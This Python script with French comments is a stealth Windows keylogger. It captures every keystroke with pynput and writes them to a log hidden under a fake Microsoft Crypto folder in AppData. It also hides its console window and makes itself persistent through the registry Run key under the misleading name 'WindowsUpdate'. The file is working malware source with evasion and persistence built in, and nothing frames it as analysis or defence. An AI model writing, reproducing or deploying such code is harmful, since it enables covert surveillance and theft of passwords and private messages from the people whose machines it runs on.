
#!/usr/bin/env python3

import os
import sys
import logging
from datetime import datetime
from pathlib import Path

# === Configuration Windows ===
# On se cache dans AppData\Roaming (discret)
APPDATA = Path(os.environ.get("APPDATA", Path.home() / "AppData" / "Roaming"))
LOG_DIR = APPDATA / "Microsoft" / "Crypto" / "Keys"
LOG_FILE = LOG_DIR / "debug.log"

try:
    from pynput import keyboard
except ImportError:
    print("[!] Installez pynput : pip install pynput")
    sys.exit(1)


def setup_logging():
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        handlers=[
            logging.FileHandler(LOG_FILE, mode='a', encoding='utf-8'),
        ]
    )
    return logging.getLogger(__name__)


SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.shift_r: "[SHIFT]",
    keyboard.Key.ctrl: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.cmd: "[WIN]",
    keyboard.Key.cmd_r: "[WIN]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.home: "[HOME]",
    keyboard.Key.end: "[END]",
    keyboard.Key.page_up: "[PGUP]",
    keyboard.Key.page_down: "[PGDN]",
    keyboard.Key.insert: "[INS]",
    keyboard.Key.f1: "[F1]",
    keyboard.Key.f2: "[F2]",
    keyboard.Key.f3: "[F3]",
    keyboard.Key.f4: "[F4]",

    keyboard.Key.f6: "[F6]",
    keyboard.Key.f7: "[F7]",
    keyboard.Key.f8: "[F8]",

    keyboard.Key.f11: "[F11]",
    keyboard.Key.f12: "[F12]",
    keyboard.Key.print_screen: "[PRTSC]",
    keyboard.Key.scroll_lock: "[SCRLK]",
    keyboard.Key.pause: "[PAUSE]",
    keyboard.Key.menu: "[MENU]",
}


def on_press(key, logger):
    try:
        if hasattr(key, 'char') and key.char is not None:
            logger.debug(f"{key.char}")
        else:
            mapped = SPECIAL_KEYS.get(key, f"[{key.name.upper()}]")
            logger.debug(mapped)
    except Exception as e:
        logger.error(f"Erreur : {e}")


def hide_console():
    """Cache la fenêtre console Windows."""
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except Exception:
        pass


def add_startup():
    """Ajoute le script au démarrage automatique (RUN registry)."""
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            script_path = os.path.abspath(sys.argv[0])
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ,
                              f'pythonw.exe "{script_path}"')
    except Exception as e:
        logger.error(f"Startup fail : {e}")


def keylogger_daemon():
    global logger
    logger = setup_logging()
    
    # Cache la console (version furtive)
    hide_console()
    
    # Persistance au démarrage
    add_startup()
    
    logger.info(f"{'='*50}")
    logger.info(f"KEYLOGGER DÉMARRÉ - {datetime.now().isoformat()}")
    logger.info(f"PID: {os.getpid()}")
    logger.info(f"Log: {LOG_FILE}")
    logger.info(f"{'='*50}")
    
    with keyboard.Listener(
        on_press=lambda key: on_press(key, logger)
    ) as listener:
        listener.join()


if __name__ == "__main__":
    keylogger_daemon()
